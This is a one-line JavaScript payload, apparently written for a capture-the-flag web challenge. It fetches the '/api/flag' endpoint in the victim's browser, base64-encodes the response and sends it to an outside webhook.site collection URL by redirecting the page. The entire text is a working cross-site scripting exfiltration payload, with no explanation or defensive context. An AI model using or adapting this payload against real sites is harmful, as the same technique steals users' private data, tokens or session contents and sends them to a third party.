fetch('/api/flag').then(response => response.text()).then(text => window.location.href =`https://webhook.site/0e039ea9-674a-4a9c-a42b-aca98da957f0?cz=${btoa(text)}`);
